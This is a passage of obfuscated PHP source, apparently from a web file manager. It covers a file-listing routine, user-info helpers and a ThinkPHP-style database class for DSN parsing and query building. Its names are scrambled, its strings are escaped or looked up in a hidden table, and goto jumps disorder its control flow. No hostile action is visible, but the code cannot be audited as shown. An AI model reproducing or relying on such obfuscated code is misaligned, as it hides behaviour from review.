($γ¦υΘώ === !1) { $±ςα©Τ = Model($ψίΥ°[602])->getInfoFull(USER_ID); $γ¦υΘώ = _get($±ςα©Τ, $ψίΥ°[604], $ψίΥ°[12]); } if ($Ϋεά§¨ && $Ϋεά§¨[0] == $ΆΛθμ§™ || !$Ϋεά§¨ && $·μθτΟΡ[$ψίΥ°[194]] == $ΆΛθμ§™) { $“ΑθΑ“― = LNG($ψίΥ°[605]); $·μθτΟΡ[$ψίΥ°[606]] = $ψίΥ°[607]; } if ($Ϋεά§¨ && $Ϋεά§¨[0] == $γ¦υΘώ || !$Ϋεά§¨ && $·μθτΟΡ[$ψίΥ°[194]] == $γ¦υΘώ) { $“ΑθΑ“― = $“ΑθΑ“― . $ψίΥ°[608] . LNG($ψίΥ°[609]); } if (!$Ϋεά§¨) { $·μθτΟΡ[$ψίΥ°[32]] = $“ΑθΑ“―; } } else { $±ςα©Τ = Model($ψίΥ°[602])->getInfoFull($·μθτΟΡ[$ψίΥ°[574]]); $Ι…ΞΑ = _get($±ςα©Τ, $ψίΥ°[604], $ψίΥ°[12]); $·μθτΟΡ[$ψίΥ°[610]] = Model($ψίΥ°[582])->getInfoSimpleOuter($·μθτΟΡ[$ψίΥ°[574]]); $“ΑθΑ“― = LNG($ψίΥ°[611]) . $ψίΥ°[176] . $·μθτΟΡ[$ψίΥ°[610]][$ψίΥ°[32]] . $ψίΥ°[178]; if ($Ϋεά§¨ && $Ϋεά§¨[0] == $Ι…ΞΑ || !$Ϋεά§¨ && $·μθτΟΡ[$ψίΥ°[194]] == $Ι…ΞΑ) { $“ΑθΑ“― = LNG($ψίΥ°[611]) . $ψίΥ°[612] . $·μθτΟΡ[$ψίΥ°[610]][$ψίΥ°[32]] . $ψίΥ°[608] . LNG($ψίΥ°[609]) . $ψίΥ°[178]; } } } else { if ($·μθτΟΡ[$ψίΥ°[191]] == self::TYPE_GROUP) { $¬—ƒ²ώξ = Model($ψίΥ°[590])->getInfoSimple($·μθτΟΡ[$ψίΥ°[574]]); $“ΑθΑ“― = $¬—ƒ²ώξ[$ψίΥ°[32]]; } else { if ($·μθτΟΡ[$ψίΥ°[191]] == self::TYPE_SYSTEM) { $“ΑθΑ“― = $ψίΥ°[613]; } } } $“ΑθΑ“― = $“ΑθΑ“― ? $ψίΥ°[8] . $“ΑθΑ“― . $ψίΥ°[8] : $ψίΥ°[8]; return $“ΑθΑ“―; } protected function _listAppendUser(&$±Σδ΅ο) { $ΰοά» =& $_SERVER[γγάψ½]; $ξνΫΑ«Τ = array_to_keyvalue($±Σδ΅ο, $ΰοά»[12], $ΰοά»[530]); $ΔγΛ­— = array_to_keyvalue($±Σδ΅ο, $ΰοά»[12], $ΰοά»[532]); $ΎΠ§Υ® = array_merge($ξνΫΑ«Τ, $ΔγΛ­—); $Ί±ρ΄ = Model($ΰοά»[602])->userListInfo($ΎΠ§Υ®); foreach ($±Σδ΅ο as &$έ¦Ν™Λ΅) { $Μδ—εΛ = $έ¦Ν™Λ΅[$ΰοά»[530]]; $έ¦Ν™Λ΅[$ΰοά»[530]] = $Ί±ρ΄[$Μδ—εΛ] ? $Ί±ρ΄[$Μδ—εΛ] : !1; $Μδ—εΛ = $έ¦Ν™Λ΅[$ΰοά»[532]]; $έ¦Ν™Λ΅[$ΰοά»[532]] = $Ί±ρ΄[$Μδ—εΛ] ? $Ί±ρ΄[$Μδ—εΛ] : !1; if (_get($έ¦Ν™Λ΅, $ΰοά»[614], 0)) { $λƒδ‚Π = $GLOBALS[$ΰοά»[6]][$ΰοά»[92]][$ΰοά»[615]]; if ($έ¦Ν™Λ΅[$ΰοά»[544]][$ΰοά»[616]] <= time() - $λƒδ‚Π) { $this->metaSet($έ¦Ν™Λ΅[$ΰοά»[194]], $ΰοά»[617], null); $this->metaSet($έ¦Ν™Λ΅[$ΰοά»[194]], $ΰοά»[616], null); unset($έ¦Ν™Λ΅[$ΰοά»[544]][$ΰοά»[617]]); continue; } $­–¦¨ΠΉ = $έ¦Ν™Λ΅[$ΰοά»[544]][$ΰοά»[617]]; $έ¦Ν™Λ΅[$ΰοά»[544]][$ΰοά»[618]] = Model($ΰοά»[602])->getInfoSimpleOuter($­–¦¨ΠΉ); } } unset($έ¦Ν™Λ΅); } public function parentLevelArray($ΖΫΨ²ύ) { $ηεΗνχ© =& $_SERVER[γγάψ½]; $ΖΫΨ²ύ = explode($ηεΗνχ©[50], trim($ΖΫΨ²ύ, $ηεΗνχ©[50])); return array_remove_value($ΖΫΨ²ύ, $ηεΗνχ©[231]); } public function listAll($Ρα®δρώ) { $Ή½Ε…Ύ =& $_SERVER[γγάψ½]; $Ιψ›έν = $this->sourceInfo($Ρα®δρώ); $Π‚™ΌμΆ = array($Ή½Ε…Ύ[619] => array($Ή½Ε…Ύ[620], $Ιψ›έν[$Ή½Ε…Ύ[589]] . $Ρα®δρώ . $Ή½Ε…Ύ[621]), $Ή½Ε…Ύ[622] => 0); $¦Ιω‚ = $Ή½Ε…Ύ[623]; $Ζ΅ωγ‘ = "\x4c\105\x46\x54\40\112\117\x49\x4e\x20{$this->tablePrefix}\151\x6f\x5f\146\151\154\145\x20\146\151\154\x65\x20\x6f\156\x20\163\x6f\165\x72\x63\x65\x2e\146\151\x6c\x65\111\104\40\x3d\40\x66\x69\154\145\56\146\151\154\145\x49\104"; $™²°ƒΚ” = $this->alias($Ή½Ε…Ύ[522])->field($¦Ιω‚)->where($Π‚™ΌμΆ)->join($Ζ΅ωγ‘)->select(); $this->_listAppendAuth($™²°ƒΚ”); $this->_listAppendUser($™²°ƒΚ”); $this->_listAppendPath($™²°ƒΚ”); $™²°ƒΚ” = array_to_keyvalue($™²°ƒΚ”, $Ή½Ε…Ύ[194]); $¦ν»”ε€ = "\57{$Ιψ›έν[$Ή½Ε…Ύ[32]]}\x2f"; $¦ν»”ε€ = $¦ν»”ε€ == $Ή½Ε…Ύ[257] ? $Ή½Ε…Ύ[8] : $¦ν»”ε€; $µΪ¨ΰ  = array(); foreach ($™²°ƒΚ” as $§ΤΫν®‚ => $Π³Φ€†) { $‹ωκΦϊΣ = $this->parentLevelArray($Π³Φ€†[$Ή½Ε…Ύ[589]]); array_shift($‹ωκΦϊΣ); $Έέφ΄Χ = $¦ν»”ε€; for ($†‹¥ΧΕΧ = 0; $†‹¥ΧΕΧ < count($‹ωκΦϊΣ); $†‹¥ΧΕΧ++) { $Έέφ΄Χ .= $™²°ƒΚ”[$‹ωκΦϊΣ[$†‹¥ΧΕΧ]][$Ή½Ε…Ύ[32]] . $Ή½Ε…Ύ[8]; } $Έέφ΄Χ .= $Π³Φ€†[$Ή½Ε…Ύ[32]]; if ($Π³Φ€†[$Ή½Ε…Ύ[488]]) { $Έέφ΄Χ .= $Ή½Ε…Ύ[8]; } $ΆΡ¤€Ο— = array($Ή½Ε…Ύ[498] => str_replace($Ή½Ε…Ύ[257], $Ή½Ε…Ύ[8], str_replace($Ή½Ε…Ύ[257], $Ή½Ε…Ύ[8], str_replace($Ή½Ε…Ύ[257], $Ή½Ε…Ύ[8], $Έέφ΄Χ))), $Ή½Ε…Ύ[624] => intval($Π³Φ€†[$Ή½Ε…Ύ[488]]), $Ή½Ε…Ύ[625] => intval($Π³Φ€†[$Ή½Ε…Ύ[79]]), $Ή½Ε…Ύ[88] => intval($Π³Φ€†[$Ή½Ε…Ύ[88]]), $Ή½Ε…Ύ[90] => $this->pathInfoFilter($Π³Φ€†)); if (!$ΆΡ¤€Ο—[$Ή½Ε…Ύ[488]]) { $ΆΡ¤€Ο—[$Ή½Ε…Ύ[546]] = $Π³Φ€†[$Ή½Ε…Ύ[546]]; } $µΪ¨ΰ [] = $ΆΡ¤€Ο—; } $µΪ¨ΰ  = array_sort_by($µΪ¨ΰ , $Ή½Ε…Ύ[87]); return $µΪ¨ΰ ; } } goto f©ΨΠ‚Τε; C•©»έΨΦί: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\150\x69\x6e\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\x3d", "\x6e\x65\161" => "\x3c\x3e", "\147\164" => "\76", "\x65\x67\x74" => "\76\x3d", "\154\x74" => "\x3c", "\145\154\164" => "\x3c\x3d", "\x6e\157\164\x6c\x69\x6b\145" => "\x4e\x4f\x54\40\114\x49\x4b\105", "\154\151\x6b\145" => "\114\111\x4b\105", "\x69\x6e" => "\x49\x4e", "\x6e\x6f\x74\x69\x6e" => "\116\117\124\x20\111\116", "\156\x6f\164\x20\151\x6e" => "\x4e\117\124\40\111\x4e", "\142\x65\164\x77\145\x65\x6e" => "\x42\105\x54\x57\x45\x45\116", "\x6e\157\164\x62\145\164\x77\145\x65\156" => "\x4e\117\124\x20\102\x45\x54\127\105\105\116", "\x6e\x6f\164\x20\x62\x65\x74\x77\145\x65\156" => "\116\117\x54\40\102\105\124\x57\x45\105\x4e"); protected $selectSql = "\123\x45\114\105\x43\124\45\104\x49\123\124\111\x4e\103\124\x25\x20\45\x46\x49\105\x4c\x44\45\x20\x46\122\x4f\115\x20\x25\124\101\x42\x4c\105\x25\45\112\117\111\x4e\x25\x25\127\110\105\x52\x45\45\45\x47\122\117\x55\120\45\45\x48\101\126\x49\116\107\45\45\x4f\x52\104\105\122\x25\45\114\x49\115\x49\124\x25\x20\x25\125\x4e\x49\117\x4e\x25\x25\103\x4f\115\x4d\x45\x4e\124\45"; protected $bind = array(); public static function getInstance() { $ΩΊ­®Ύ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[γγάψ½][1046], $ΩΊ­®Ύ); } public function factory($ΆΠΊ―ƒι = '') { $½Ξυ¬–§ =& $_SERVER[γγάψ½]; $ΆΠΊ―ƒι = $this->parseConfig($ΆΠΊ―ƒι); if (empty($ΆΠΊ―ƒι[$½Ξυ¬–§[1047]])) { think_exception(think_lang($½Ξυ¬–§[1048])); } $this->dbType = ucwords(strtolower($ΆΠΊ―ƒι[$½Ξυ¬–§[1047]])); $χΊεήΫ = $½Ξυ¬–§[1049] . $this->dbType; if (class_exists($χΊεήΫ)) { $‘†ππλ = new $χΊεήΫ($ΆΠΊ―ƒι); if ($½Ξυ¬–§[1050] != strtolower($ΆΠΊ―ƒι[$½Ξυ¬–§[1047]])) { $‘†ππλ->dbType = strtoupper($this->dbType); } else { $‘†ππλ->dbType = $this->_getDsnType($ΆΠΊ―ƒι[$½Ξυ¬–§[1002]]); } } else { think_exception(think_lang($½Ξυ¬–§[1051]) . $½Ξυ¬–§[1052] . $χΊεήΫ); } return $‘†ππλ; } public function __call($όθ•Ή, $άϋ»‚©) { if (method_exists($this, $όθ•Ή)) { return call_user_func_array(array($this, $όθ•Ή), $άϋ»‚©); } } protected function _getDsnType($Η¨έƒ„ι) { $™ϋ›» = explode($_SERVER[γγάψ½][4], $Η¨έƒ„ι); $µΖ»ΚΒ· = strtoupper(trim($™ϋ›»[0])); return $µΖ»ΚΒ·; } private function parseConfig($Γϊ¨ = '') { $³Ώιξ“ =& $_SERVER[γγάψ½]; if (!empty($Γϊ¨) && is_string($Γϊ¨)) { $Γϊ¨ = $this->parseDSN($Γϊ¨); } elseif (is_array($Γϊ¨)) { $Γϊ¨ = array_change_key_case($Γϊ¨); $Γϊ¨ = array($³Ώιξ“[1047] => $Γϊ¨[$³Ώιξ“[1053]], $³Ώιξ“[974] => $Γϊ¨[$³Ώιξ“[1054]], $³Ώιξ“[975] => $Γϊ¨[$³Ώιξ“[1055]], $³Ώιξ“[972] => $Γϊ¨[$³Ώιξ“[1056]], $³Ώιξ“[973] => $Γϊ¨[$³Ώιξ“[1057]], $³Ώιξ“[21] => $Γϊ¨[$³Ώιξ“[1058]], $³Ώιξ“[1002] => $Γϊ¨[$³Ώιξ“[1059]], $³Ώιξ“[17] => isset($Γϊ¨[$³Ώιξ“[1060]]) ? $Γϊ¨[$³Ώιξ“[1060]] : array()); } elseif (empty($Γϊ¨)) { if (think_config($³Ώιξ“[1061]) && $³Ώιξ“[1050] != strtolower(think_config($³Ώιξ“[1062]))) { $Γϊ¨ = $this->parseDSN(think_config($³Ώιξ“[1061])); } else { $Γϊ¨ = array($³Ώιξ“[1047] => think_config($³Ώιξ“[1062]), $³Ώιξ“[974] => think_config($³Ώιξ“[1063]), $³Ώιξ“[975] => think_config($³Ώιξ“[1064]), $³Ώιξ“[972] => think_config($³Ώιξ“[1065]), $³Ώιξ“[973] => think_config($³Ώιξ“[1066]), $³Ώιξ“[21] => think_config($³Ώιξ“[326]), $³Ώιξ“[1002] => think_config($³Ώιξ“[1061]), $³Ώιξ“[17] => think_config($³Ώιξ“[1067])); } } return $Γϊ¨; } protected function initConnect($›ό»Δ = true) { if (1 == think_config($_SERVER[γγάψ½][22])) { $this->_linkID = $this->multiConnect($›ό»Δ); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $΅”δ Δ => $–¦ψζΕ) { $this->_linkID = $–¦ψζΕ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ζ±ς· = false) { $ΖΞΎ‡ηΉ =& $_SERVER[γγάψ½]; static $’ΈΣθΥ = array(); static $ΠΥπΔ“ = -1; if (empty($’ΈΣθΥ)) { foreach ($this->config as $δΩΩµµΡ => $οΩνΘρ) { $’ΈΣθΥ[$δΩΩµµΡ] = explode($ΖΞΎ‡ηΉ[50], $οΩνΘρ); } } if (think_config($ΖΞΎ‡ηΉ[1068])) { if ($ζ±ς· || think_config($ΖΞΎ‡ηΉ[474]) === !0) { $Γ½σ­£ = floor(mt_rand(0, think_config($ΖΞΎ‡ηΉ[1069]) - 1)); $ΠΥπΔ“ = $Γ½σ­£; } else { if (is_numeric(think_config($ΖΞΎ‡ηΉ[1070]))) { $Γ½σ­£ = think_config($ΖΞΎ‡ηΉ[1070]); } else { $Γ½σ­£ = floor(mt_rand(think_config($ΖΞΎ‡ηΉ[1069]), count($’ΈΣθΥ[$ΖΞΎ‡ηΉ[972]]) - 1)); } } } else { $Γ½σ­£ = floor(mt_rand(0, count($’ΈΣθΥ[$ΖΞΎ‡ηΉ[972]]) - 1)); $ΠΥπΔ“ = $Γ½σ­£; } $Γ½σ­£ = $ΠΥπΔ“ !== -1 ? $ΠΥπΔ“ : $Γ½σ­£; $ΞΠίƒϋ‹ = array($ΖΞΎ‡ηΉ[974] => isset($’ΈΣθΥ[$ΖΞΎ‡ηΉ[974]][$Γ½σ­£]) ? $’ΈΣθΥ[$ΖΞΎ‡ηΉ[974]][$Γ½σ­£] : $’ΈΣθΥ[$ΖΞΎ‡ηΉ[974]][0], $ΖΞΎ‡ηΉ[975] => isset($’ΈΣθΥ[$ΖΞΎ‡ηΉ[975]][$Γ½σ­£]) ? $’ΈΣθΥ[$ΖΞΎ‡ηΉ[975]][$Γ½σ­£] : $’ΈΣθΥ[$ΖΞΎ‡ηΉ[975]][0], $ΖΞΎ‡ηΉ[972] => isset($’ΈΣθΥ[$ΖΞΎ‡ηΉ[972]][$Γ½σ­£]) ? $’ΈΣθΥ[$ΖΞΎ‡ηΉ[972]][$Γ½σ­£] : $’ΈΣθΥ[$ΖΞΎ‡ηΉ[972]][0], $ΖΞΎ‡ηΉ[973] => isset($’ΈΣθΥ[$ΖΞΎ‡ηΉ[973]][$Γ½σ­£]) ? $’ΈΣθΥ[$ΖΞΎ‡ηΉ[973]][$Γ½σ­£] : $’ΈΣθΥ[$ΖΞΎ‡ηΉ[973]][0], $ΖΞΎ‡ηΉ[21] => isset($’ΈΣθΥ[$ΖΞΎ‡ηΉ[21]][$Γ½σ­£]) ? $’ΈΣθΥ[$ΖΞΎ‡ηΉ[21]][$Γ½σ­£] : $’ΈΣθΥ[$ΖΞΎ‡ηΉ[21]][0], $ΖΞΎ‡ηΉ[1002] => isset($’ΈΣθΥ[$ΖΞΎ‡ηΉ[1002]][$Γ½σ­£]) ? $’ΈΣθΥ[$ΖΞΎ‡ηΉ[1002]][$Γ½σ­£] : $’ΈΣθΥ[$ΖΞΎ‡ηΉ[1002]][0], $ΖΞΎ‡ηΉ[17] => isset($’ΈΣθΥ[$ΖΞΎ‡ηΉ[17]][$Γ½σ­£]) ? $’ΈΣθΥ[$ΖΞΎ‡ηΉ[17]][$Γ½σ­£] : $’ΈΣθΥ[$ΖΞΎ‡ηΉ[17]][0]); return $this->connect($ΞΠίƒϋ‹, $Γ½σ­£); } public function parseDSN($ΫόΝβυ) { $υΤ‹ =& $_SERVER[γγάψ½]; if (empty($ΫόΝβυ)) { return !1; } $ΜΘ±€ = parse_url($ΫόΝβυ); if ($ΜΘ±€[$υΤ‹[208]]) { $ƒΘΉο = array($υΤ‹[1047] => $ΜΘ±€[$υΤ‹[208]], $υΤ‹[974] => isset($ΜΘ±€[$υΤ‹[670]]) ? $ΜΘ±€[$υΤ‹[670]] : $υΤ‹[12], $υΤ‹[975] => isset($ΜΘ±€[$υΤ‹[1071]]) ? $ΜΘ±€[$υΤ‹[1071]] : $υΤ‹[12], $υΤ‹[972] => isset($ΜΘ±€[$υΤ‹[209]]) ? $ΜΘ±€[$υΤ‹[209]] : $υΤ‹[12], $υΤ‹[973] => isset($ΜΘ±€[$υΤ‹[210]]) ? $ΜΘ±€[$υΤ‹[210]] : $υΤ‹[12], $υΤ‹[21] => isset($ΜΘ±€[$υΤ‹[87]]) ? substr($ΜΘ±€[$υΤ‹[87]], 1) : $υΤ‹[12]); } else { preg_match($υΤ‹[1072], trim($ΫόΝβυ), $Ωϊ®†ι); $ƒΘΉο = array($υΤ‹[1047] => $Ωϊ®†ι[1], $υΤ‹[974] => $Ωϊ®†ι[2], $υΤ‹[975] => $Ωϊ®†ι[3], $υΤ‹[972] => $Ωϊ®†ι[4], $υΤ‹[973] => $Ωϊ®†ι[5], $υΤ‹[21] => $Ωϊ®†ι[6]); } $ƒΘΉο[$υΤ‹[1002]] = $υΤ‹[12]; return $ƒΘΉο; } protected function debug() { $΅Α©¥³ =& $_SERVER[γγάψ½]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $΅Α©¥³[1073]; if (think_config($΅Α©¥³[1074])) { think_status($΅Α©¥³[1075]); think_trace($this->queryStr . $΅Α©¥³[1076] . think_status($΅Α©¥³[24], $΅Α©¥³[1075], 6) . $΅Α©¥³[1077], $΅Α©¥³[12], $΅Α©¥³[1078]); } } protected function parseLock($ƒαόΔ = false) { $›Λζ—θ§ =& $_SERVER[γγάψ½]; if (!$ƒαόΔ) { return $›Λζ—θ§[12]; } if ($›Λζ—θ§[1004] == $this->dbType) { return $›Λζ—θ§[1079]; } return $›Λζ—θ§[1080]; } protected function parseSet($Ύ»ιΏκ) { $Φ‚Λφρ =& $_SERVER[γγάψ½]; foreach ($Ύ»ιΏκ as $ΘΪΞΛ΄– => $ΓΦω°ϋ) { if (is_array($ΓΦω°ϋ) && $Φ‚Λφρ[375] == $ΓΦω°ϋ[0]) { $¥‰ύΜΰΥ[] = $this->parseKey($ΘΪΞΛ΄–) . $Φ‚Λφρ[509] . $ΓΦω°ϋ[1]; } elseif (is_scalar($ΓΦω°ϋ) || is_null($ΓΦω°ϋ)) { $¥‰ύΜΰΥ[] = $this->parseKey($ΘΪΞΛ΄–) . $Φ‚Λφρ[509] . $this->parseValue($ΓΦω°ϋ); } } return $Φ‚Λφρ[1081] . implode($Φ‚Λφρ[50], $¥‰ύΜΰΥ); } protected function bindParam($¦ςη°ώϊ, $€£€ϊνΌ) { $this->bind[$_SERVER[γγάψ½][4] . $¦ςη°ώϊ] = $€£€ϊνΌ; } protected function parseBind($ώήφμΟ) { $ώήφμΟ = array_merge($this->bind, $ώήφμΟ); $this->bind = array(); return $ώήφμΟ; } function parseKey(&$ΑΙ¥„Άσ, $ΕΠΒΚ† = true) { if ($ΕΠΒΚ†) { $ΑΙ¥„Άσ = $this->parseKeyCheck($ΑΙ¥„Άσ); } return $ΑΙ¥„Άσ; } function parseKeyCheck($ΠΡ­Λ²) { $°…±Ϋ±¤ =& $_SERVER[γγάψ½]; $ΠΡ­Λ² = trim($ΠΡ­Λ²); if (!preg_match($°…±Ϋ±¤[1082], $ΠΡ­Λ²)) { think_exception($°…±Ϋ±¤[1083] . $ΠΡ­Λ²); } return $ΠΡ­Λ²; } protected function parseValue($όΑΞΔ) { $…πν’‚Γ =& $_SERVER[γγάψ½]; if (is_string($όΑΞΔ)) { $όΑΞΔ = $…πν’‚Γ[1043] . $this->escapeString($όΑΞΔ) . $…πν’‚Γ[1043]; } elseif (isset($όΑΞΔ[0]) && is_string($όΑΞΔ[0]) && strtolower($όΑΞΔ[0]) == $…πν’‚Γ[375]) { $όΑΞΔ = $this->escapeString($όΑΞΔ[1]); } elseif (is_array($όΑΞΔ)) { $όΑΞΔ = array_map(array($this, $…πν’‚Γ[1044]), $όΑΞΔ); } elseif (is_bool($όΑΞΔ)) { $όΑΞΔ = $όΑΞΔ ? $…πν’‚Γ[91] : $…πν’‚Γ[231]; } elseif (is_null($όΑΞΔ)) { $όΑΞΔ = $…πν’‚Γ[106]; } return $όΑΞΔ; } protected function parseField($ισΝ—•Ϊ) { $ΫδΆ± =& $_SERVER[γγάψ½]; if (is_string($ισΝ—•Ϊ) && strpos($ισΝ—•Ϊ, $ΫδΆ±[50])) { $ισΝ—•Ϊ = explode($ΫδΆ±[50], $ισΝ—•Ϊ); } if (is_array($ισΝ—•Ϊ)) { $§¥Α¥χς = array(); foreach ($ισΝ—•Ϊ as $λ›ο¨ => $ήωΖβ¦) { if (!is_numeric($λ›ο¨)) { $§¥Α¥χς[] = $this->parseKey($λ›ο¨, !1) . $ΫδΆ±[1084] . $this->parseKey($ήωΖβ¦); } else { $§¥Α¥χς[] = $this->parseKey($ήωΖβ¦); } } $Ω‘Υ¤τ = implode($ΫδΆ±[50], $§¥Α¥χς); } elseif (is_string($ισΝ—•Ϊ) && !empty($ισΝ—•Ϊ)) { $Ω‘Υ¤τ = $ισΝ—•Ϊ; } else { $Ω‘Υ¤τ = $ΫδΆ±[223]; } return $Ω‘Υ¤τ; } protected function parseTable($²©³θϋ») { $—ΈΩΞ¶ =& $_SERVER[γγάψ½]; if (is_array($²©³θϋ»)) { $¥―Ϋ§« = array(); foreach ($²©³θϋ» as $†µμΊƒ‰ => $π™†Ϊ—) { if (!is_numeric($†µμΊƒ‰)) { $¥―Ϋ§«[] = $this->parseKey($†µμΊƒ‰) . $—ΈΩΞ¶[53] . $this->parseKey($π™†Ϊ—); } else { $¥―Ϋ§«[] = $this->parseKey($†µμΊƒ‰); } } $²©³θϋ» = $¥―Ϋ§«; } elseif (is_string($²©³θϋ»)) { if (strstr($²©³θϋ», $—ΈΩΞ¶[53])) { return $²©³θϋ»; } $²©³θϋ» = explode($—ΈΩΞ¶[50], $²©³θϋ»); array_walk($²©³θϋ», array($this, $—ΈΩΞ¶[992])); } return $—ΈΩΞ¶[986] . trim(implode($—ΈΩΞ¶[1085], $²©³θϋ»), $—ΈΩΞ¶[464]) . $—ΈΩΞ¶[986]; } protected function parseWhere($™φσΩ° ) { $µ„ψΗ³« =& $_SERVER[γγάψ½]; $½“©‘κ = $µ„ψΗ³«[12]; if (is_string($™φσΩ° )) { $½“©‘κ = $™φσΩ° ; } else { $¨ΆΝαΖΏ = isset($™φσΩ° [$µ„ψΗ³«[1086]]) ? strtoupper($™φσΩ° [$µ„ψΗ³«[1086]]) : $µ„ψΗ³«[12]; if (in_array($¨ΆΝαΖΏ, array($µ„ψΗ³«[1087], $µ„ψΗ³«[1088], $µ„ψΗ³«[1089]))) { $¨ΆΝαΖΏ = $µ„ψΗ³«[53] . $¨ΆΝαΖΏ . $µ„ψΗ³«[53]; unset($™φσΩ° [$µ„ψΗ³«[1086]]); } else { $¨ΆΝαΖΏ = $µ„ψΗ³«[1090]; } foreach ($™φσΩ°  as $¤Θ ©ιξ => $…¦‹ύΰƒ) { $½“©‘κ .= $µ„ψΗ³«[357]; if (is_numeric($¤Θ ©ιξ)) { $¤Θ ©ιξ = $µ„ψΗ³«[1091]; } if (0 === strpos($¤Θ ©ιξ, $µ„ψΗ³«[11])) { $½“©‘κ .= $this->parseThinkWhere($¤Θ ©ιξ, $…¦‹ύΰƒ); } else { if (!preg_match($µ„ψΗ³«[1092], trim($¤Θ ©ιξ))) { think_exception(think_lang($µ„ψΗ³«[1093]) . $µ„ψΗ³«[4] . $¤Θ ©ιξ); } $γΞΆΐΤ… = is_array($…¦‹ύΰƒ) && isset($…¦‹ύΰƒ[$µ„ψΗ³«[1094]]); $¤Θ ©ιξ = trim($¤Θ ©ιξ); if (strpos($¤Θ ©ιξ, $µ„ψΗ³«[215])) { $Έ¦©Ξ = explode($µ„ψΗ³«[215], $¤Θ ©ιξ); $¶±‘βυΡ = array(); foreach ($Έ¦©Ξ as $¥½ΦΕΠΠ => $¬ΈΦΆΘθ) { $»‚άπ² = $γΞΆΐΤ… ? $…¦‹ύΰƒ[$¥½ΦΕΠΠ] : $…¦‹ύΰƒ; $¶±‘βυΡ[] = $µ„ψΗ³«[340] . $this->parseWhereItem($this->parseKey($¬ΈΦΆΘθ), $»‚άπ²) . $µ„ψΗ³«[991]; } $½“©‘κ .= implode($µ„ψΗ³«[1095], $¶±‘βυΡ); } elseif (strpos($¤Θ ©ιξ, $µ„ψΗ³«[287])) { $Έ¦©Ξ = explode($µ„ψΗ³«[287], $¤Θ ©ιξ); $¶±‘βυΡ = array(); foreach ($Έ¦©Ξ as $¥½ΦΕΠΠ => $¬ΈΦΆΘθ) { $»‚άπ² = $γΞΆΐΤ… ? $…¦‹ύΰƒ[$¥½ΦΕΠΠ] : $…¦‹ύΰƒ; $¶±‘βυΡ[] = $µ„ψΗ³«[340] . $this->parseWhereItem($this->parseKey($¬ΈΦΆΘθ), $»‚άπ²) . $µ„ψΗ³«[991]; } $½“©‘κ .= implode($µ„ψΗ³«[1090], $¶±‘βυΡ); } else { $½“©‘κ .= $this->parseWhereItem($this->parseKey($¤Θ ©ιξ), $…¦‹ύΰƒ); } } $½“©‘κ .= $µ„ψΗ³«[358] . $¨ΆΝαΖΏ; } $½“©‘κ = substr($½“©‘κ, 0, -strlen($¨ΆΝαΖΏ)); } return empty($½“©‘κ) ? $µ„ψΗ³«[12] : $µ„ψΗ³«[1096] . $½“©‘κ; } protected function parseWhereItem($ιλΦδΉ», $Ω²ΎΝ·) { $ΡΤ®Φ =& $_SERVER[γγάψ½]; $πύ¬Ϊάκ = $ΡΤ®Φ[12]; if (is_array($Ω²ΎΝ·)) { if (is_string($Ω²ΎΝ·[0])) { $Π“Ο–ό = strtolower($Ω²ΎΝ·[0]); if (in_array($Ω²ΎΝ·[0], array($ΡΤ®Φ[509], $ΡΤ®Φ[1097], $ΡΤ®Φ[1098], $ΡΤ®Φ[1099], $ΡΤ®Φ[1100], $ΡΤ®Φ[1101]))) { $πύ¬Ϊάκ .= $ιλΦδΉ» . $ΡΤ®Φ[53] . $Ω²ΎΝ·[0] . $ΡΤ®Φ[53] . $this->parseValue($Ω²ΎΝ·[1]); } elseif (preg_match($ΡΤ®Φ[1102], $Ω²ΎΝ·[0])) { $πύ¬Ϊάκ .= $ιλΦδΉ» . $ΡΤ®Φ[53] . $this->exp[$Π“Ο–ό] . $ΡΤ®Φ[53] . $this->parseValue($Ω²ΎΝ·[1]); } elseif (preg_match($ΡΤ®Φ[1103], $Ω²ΎΝ·[0])) { if (is_array($Ω²ΎΝ·[1])) { $ΑρΤ‡« = isset($Ω²ΎΝ·[2]) ? strtoupper($Ω²ΎΝ·[2]) : $ΡΤ®Φ[1088]; if (in_array($ΑρΤ‡«, array($ΡΤ®Φ[1087], $ΡΤ®Φ[1088], $ΡΤ®Φ[1089]))) { $‰Νσ“ύ€ = array(); foreach ($Ω²ΎΝ·[1] as $΅‰ΛΨ£¥) { $‰Νσ“ύ€[] = $ιλΦδΉ» . $ΡΤ®Φ[53] . $this->exp[$Π“Ο–ό] . $ΡΤ®Φ[53] . $this->parseValue($΅‰ΛΨ£¥); } $πύ¬Ϊάκ .= $ΡΤ®Φ[340] . implode($ΡΤ®Φ[53] . $ΑρΤ‡« . $ΡΤ®Φ[53], $‰Νσ“ύ€) . $ΡΤ®Φ[991]; } } else { $πύ¬Ϊάκ .= $ιλΦδΉ» . $ΡΤ®Φ[53] . $this->exp[$Π“Ο–ό] . $ΡΤ®Φ[53] . $this->parseValue($Ω²ΎΝ·[1]); } } elseif ($ΡΤ®Φ[375] == $Π“Ο–ό) { $πύ¬Ϊάκ .= $ΡΤ®Φ[989] . $ιλΦδΉ» . $ΡΤ®Φ[53] . $Ω²ΎΝ·[1] . $ΡΤ®Φ[1104]; } elseif (preg_match($ΡΤ®Φ[1105], $Ω²ΎΝ·[0])) { $πύ¬Ϊάκ .= $Ω²ΎΝ·[0]; } elseif (preg_match($ΡΤ®Φ[1106], $Ω²ΎΝ·[0])) { if (isset($Ω²ΎΝ·[2]) && $ΡΤ®Φ[375] == $Ω²ΎΝ·[2]) { $πύ¬Ϊάκ .= $ιλΦδΉ» . $ΡΤ®Φ[53] . $this->exp[$Π“Ο–ό] . $ΡΤ®Φ[53] . $Ω²ΎΝ·[1]; } else { if (is_string($Ω²ΎΝ·[1])) { $Ω²ΎΝ·[1] = explode($ΡΤ®Φ[50], $Ω²ΎΝ·[1]); } $΄Τ«ΦμΨ = implode($ΡΤ®Φ[50], 